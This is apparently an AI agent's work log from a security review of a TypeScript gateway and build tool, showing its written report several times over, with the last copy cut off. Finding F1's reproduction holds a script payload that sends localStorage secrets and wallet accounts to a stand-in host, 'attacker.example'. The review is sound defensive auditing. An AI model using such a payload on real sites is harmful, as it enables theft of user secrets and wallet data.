+./.git/hooks/post-update.sample
+./.git/hooks/pre-applypatch.sample
+./.git/hooks/pre-commit.sample
+./.git/hooks/pre-merge-commit.sample
+./.git/hooks/pre-push.sample
+./.git/hooks/pre-rebase.sample
+./.git/hooks/pre-receive.sample
+./.git/hooks/prepare-commit-msg.sample
+./.git/hooks/push-to-checkout.sample
+./.git/hooks/sendemail-validate.sample
+./.git/hooks/update.sample
+./.git/index
+./.git/info/exclude
+./.git/logs/HEAD
+./src/core/abi.ts
+./src/core/errors.ts
+./src/core/ports.ts
+./src/core/resolve.ts
+./src/core/target.ts
+./tools/build.ts
+./tools/chains.ts
+./tools/inline.ts
+drwxrwxr-x 2 openclaw openclaw 40 Nov 21 12:59 /tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol
+
+exec
+/bin/bash -lc "node - <<'NODE'
+for (const s of ['https://user:secret@example.com/rpc','https://example.com/rpc']) {
+  try { const r = new Request(s, {method:'POST'}); console.log('accepted', r.url); }
+  catch (e) { console.log('rejected', s, e.name, e.message); }
+}
+NODE" in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+rejected https://user:secret@example.com/rpc TypeError Request cannot be constructed from a URL that includes credentials: https://user:secret@example.com/rpc
+accepted https://example.com/rpc
+
+exec
+/bin/bash -lc "node --experimental-strip-types --input-type=module - <<'NODE'
+import { parseChains } from './tools/chains.ts';
+console.log(JSON.stringify(parseChains({'1':['https://user:secret@example.com/rpc']})));
+NODE" in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+{"1":["https://user:secret@example.com/rpc"]}
+
+codex
+I’ve completed the adversarial pass. I found four reportable issues: the deliberate but high-impact cross-chain origin collapse, unbounded total RPC failover time, credential-bearing endpoint URLs being accepted and published, and symlink-following writes in the build output. I’m writing these with exact locations and one-line reproductions, followed by concise coverage notes for the required surfaces.
+apply patch
+patch: completed
+/tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+diff --git a//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..7388dc0c0ef6ce377bdbe4d61eb87514c80364c4
+--- /dev/null
++++ b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+@@ -0,0 +1,80 @@
++# Independent security review
++
++## Execution constraints
++
++I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.
++
++## Severity scale
++
++- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
++- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
++- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
++- **Low:** limited impact, or impact requiring unusually strong local/deployer control.
++
++## Findings
++
++### F1 — High — Every configured chain can exercise every other chain's origin authority
++
++**Location:** `src/core/target.ts:204`
++
++In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.
++
++The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.
++
++**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.
++
++### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline
++
++**Location:** `src/adapters/rpc/fetch.ts:85`
++
++Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.
++
++This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.
++
++**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.
++
++### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable
++
++**Location:** `tools/chains.ts:50`
++
++Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.
++
++The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.
++
++**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.
++
++### F4 — Medium — Output writes follow attacker-planted symbolic links
++
++**Location:** `tools/build.ts:114`
++
++The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.
++
++This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.
++
++**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.
++
++## Required-surface notes (not additional findings)
++
++### Contract selection and redirects
++
++- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
++- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
++- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
++- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.
++
++### Contract-controlled response metadata and inline rendering
++
++- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
++- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
++- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.
++
++### Worker, loop guard, RPC body handling, and ABI
++
++- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
++- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
++- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
++- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.
++
++### Build injection
++
++`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
+
+diff --git a//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..7388dc0c0ef6ce377bdbe4d61eb87514c80364c4
+--- /dev/null
++++ b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+@@ -0,0 +1,80 @@
++# Independent security review
++
++## Execution constraints
++
++I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.
++
++## Severity scale
++
++- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
++- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
++- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
++- **Low:** limited impact, or impact requiring unusually strong local/deployer control.
++
++## Findings
++
++### F1 — High — Every configured chain can exercise every other chain's origin authority
++
++**Location:** `src/core/target.ts:204`
++
++In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.
++
++The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.
++
++**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.
++
++### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline
++
++**Location:** `src/adapters/rpc/fetch.ts:85`
++
++Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.
++
++This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.
++
++**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.
++
++### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable
++
++**Location:** `tools/chains.ts:50`
++
++Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.
++
++The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.
++
++**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.
++
++### F4 — Medium — Output writes follow attacker-planted symbolic links
++
++**Location:** `tools/build.ts:114`
++
++The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.
++
++This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.
++
++**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.
++
++## Required-surface notes (not additional findings)
++
++### Contract selection and redirects
++
++- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
++- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
++- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
++- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.
++
++### Contract-controlled response metadata and inline rendering
++
++- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
++- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
++- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.
++
++### Worker, loop guard, RPC body handling, and ABI
++
++- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
++- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
++- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
++- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.
++
++### Build injection
++
++`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
+
+exec
+/bin/bash -lc "wc -l /tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md && sed -n '1,260p' /tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md && git status --short" in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+80 /tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+# Independent security review
+
+## Execution constraints
+
+I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.
+
+## Severity scale
+
+- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
+- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
+- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
+- **Low:** limited impact, or impact requiring unusually strong local/deployer control.
+
+## Findings
+
+### F1 — High — Every configured chain can exercise every other chain's origin authority
+
+**Location:** `src/core/target.ts:204`
+
+In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.
+
+The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.
+
+**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.
+
+### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline
+
+**Location:** `src/adapters/rpc/fetch.ts:85`
+
+Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.
+
+This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.
+
+**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.
+
+### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable
+
+**Location:** `tools/chains.ts:50`
+
+Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.
+
+The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.
+
+**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.
+
+### F4 — Medium — Output writes follow attacker-planted symbolic links
+
+**Location:** `tools/build.ts:114`
+
+The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.
+
+This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.
+
+**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.
+
+## Required-surface notes (not additional findings)
+
+### Contract selection and redirects
+
+- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
+- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
+- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
+- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.
+
+### Contract-controlled response metadata and inline rendering
+
+- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
+- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
+- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.
+
+### Worker, loop guard, RPC body handling, and ABI
+
+- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
+- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
+- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
+- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.
+
+### Build injection
+
+`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
+
+diff --git a//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..7388dc0c0ef6ce377bdbe4d61eb87514c80364c4
+--- /dev/null
++++ b//tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol/full-report.md
+@@ -0,0 +1,80 @@
++# Independent security review
++
++## Execution constraints
++
++I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.
++
++## Severity scale
++
++- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
++- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
++- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
++- **Low:** limited impact, or impact requiring unusually strong local/deployer control.
++
++## Findings
++
++### F1 — High — Every configured chain can exercise every other chain's origin authority
++
++**Location:** `src/core/target.ts:204`
++
++In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.
++
++The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.
++
++**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.
++
++### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline
++
++**Location:** `src/adapters/rpc/fetch.ts:85`
++
++Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.
++
++This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.
++
++**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.
++
++### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable
++
++**Location:** `tools/chains.ts:50`
++
++Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.
++
